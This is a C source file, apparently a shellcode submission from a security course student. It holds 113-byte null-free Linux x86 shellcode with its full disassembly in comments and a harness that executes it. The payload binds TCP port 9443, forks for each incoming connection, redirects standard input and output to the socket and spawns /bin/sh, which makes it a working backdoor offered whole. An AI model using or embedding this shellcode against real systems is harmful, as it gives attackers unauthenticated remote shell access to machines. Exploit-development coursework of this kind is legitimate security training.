/*
Title:      Linux x86 TCP Bind Shell + fork() - 113 bytes (NULL Free)
Author:     Amine Kanane <aminekanane_93@hotmail.com>
Student-ID: SLAE - 1203
Desc:       Listen for a connection on Local Port 9443 and spawn a command shell
            This version support multiple simultaneous connections using fork().
	    Also this shellcode does not use the classic socketcall() syscall.
Tested on:  Linux/x86 - SMP Debian 4.9.30-1kali1
Date:       7 May 2018
Disassembly of section .text:
08048060 <_start>:
 8048060:	31 c0                	xor    eax,eax
 8048062:	31 db                	xor    ebx,ebx
 8048064:	31 c9                	xor    ecx,ecx
 8048066:	31 d2                	xor    edx,edx
 8048068:	66 b8 67 01          	mov    ax,0x167
 804806c:	b3 02                	mov    bl,0x2
 804806e:	b1 01                	mov    cl,0x1
 8048070:	cd 80                	int    0x80
 8048072:	89 c3                	mov    ebx,eax
 8048074:	66 b8 69 01          	mov    ax,0x169
 8048078:	52                   	push   edx
 8048079:	66 68 24 e3          	pushw  0xe324 ; <== This is where we set the port number, please note that you need to adapt the number using htons() before :)
 804807d:	66 6a 02             	pushw  0x2
 8048080:	89 e1                	mov    ecx,esp
 8048082:	b2 10                	mov    dl,0x10
 8048084:	cd 80                	int    0x80
 8048086:	66 b8 6b 01          	mov    ax,0x16b
 804808a:	31 c9                	xor    ecx,ecx
 804808c:	cd 80                	int    0x80
0804808e <infinite>:
 804808e:	31 d2                	xor    edx,edx
 8048090:	31 f6                	xor    esi,esi
 8048092:	66 b8 6c 01          	mov    ax,0x16c
 8048096:	cd 80                	int    0x80
 8048098:	89 c6                	mov    esi,eax
 804809a:	31 c0                	xor    eax,eax
 804809c:	b0 02                	mov    al,0x2
 804809e:	cd 80                	int    0x80
 80480a0:	31 ff                	xor    edi,edi
 80480a2:	39 f8                	cmp    eax,edi
 80480a4:	75 e8                	jne    804808e <infinite>
 80480a6:	31 c0                	xor    eax,eax
 80480a8:	b0 06                	mov    al,0x6
 80480aa:	cd 80                	int    0x80
 80480ac:	89 f3                	mov    ebx,esi
 80480ae:	b1 02                	mov    cl,0x2
080480b0 <loop_dup>:
 80480b0:	b0 3f                	mov    al,0x3f
 80480b2:	cd 80                	int    0x80
 80480b4:	fe c9                	dec    cl
 80480b6:	79 f8                	jns    80480b0 <loop_dup>
 80480b8:	31 c0                	xor    eax,eax
 80480ba:	50                   	push   eax
 80480bb:	89 e2                	mov    edx,esp
 80480bd:	68 2f 2f 73 68       	push   0x68732f2f
 80480c2:	68 2f 62 69 6e       	push   0x6e69622f
 80480c7:	89 e3                	mov    ebx,esp
 80480c9:	50                   	push   eax
 80480ca:	53                   	push   ebx
 80480cb:	89 e1                	mov    ecx,esp
 80480cd:	b0 0b                	mov    al,0xb
 80480cf:	cd 80                	int    0x80
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8"
                       "\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3"
                       "\x66\xb8\x69\x01\x52\x66\x68"
                       "\x24\xe3" // ==> port number = 9443; sock_ad.sin_port = htons(9443);
                       "\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x66"
                       "\xb8\x6b\x01\x31\xc9\xcd\x80\x31\xd2\x31"
                       "\xf6\x66\xb8\x6c\x01\xcd\x80\x89\xc6\x31"
                       "\xc0\xb0\x02\xcd\x80\x31\xff\x39\xf8\x75"
                       "\xe8\x31\xc0\xb0\x06\xcd\x80\x89\xf3\xb1"
                       "\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x31"
                       "\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68"
                       "\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1"
                       "\xb0\x0b\xcd\x80";
main()
{
	printf("Shellcode Length: %d\n", strlen(code));

	int (*ret)() = (int(*)())code;
	ret();
}